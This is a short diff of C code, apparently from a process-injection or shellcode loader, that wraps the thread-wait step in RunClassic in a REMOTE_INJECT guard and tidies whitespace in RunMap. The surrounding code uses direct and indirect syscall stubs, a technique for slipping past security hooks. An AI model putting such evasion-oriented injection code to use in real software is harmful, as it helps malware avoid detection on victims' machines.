@@ -157,6 +157,7 @@ BOOL RunClassic() {
     }
 
     //Wait for thread to finish
+#ifndef REMOTE_INJECT
 #ifdef SYSCALL_INDIRECT
     //Indirect syscall method
     GetSSNI(g_Fun.NtWaitForSingleObject.dwSSn, g_Fun.NtWaitForSingleObject.pSyscallIndJmp);
@@ -166,6 +167,7 @@ BOOL RunClassic() {
     //Direct syscall method
     GetSSND(g_Fun.NtWaitForSingleObject.dwSSn);
     InvokeD(hThread, FALSE, NULL);
+#endif
 #endif
     return TRUE;
 }
@@ -329,7 +331,7 @@ BOOL RunMap() {
         DEBUG_PRINT("[!] Creating a new thread failed: 0x%X\n", status);
         return FALSE;
     }
-
+    
     //If local injection wait for the thread to finish
 #ifndef REMOTE_INJECT
 #ifdef SYSCALL_INDIRECT
@@ -343,7 +345,6 @@ BOOL RunMap() {
     InvokeD(hThread, FALSE, NULL);
 #endif
 #endif
-
 
     //Closing handles
 #ifdef SYSCALL_INDIRECT
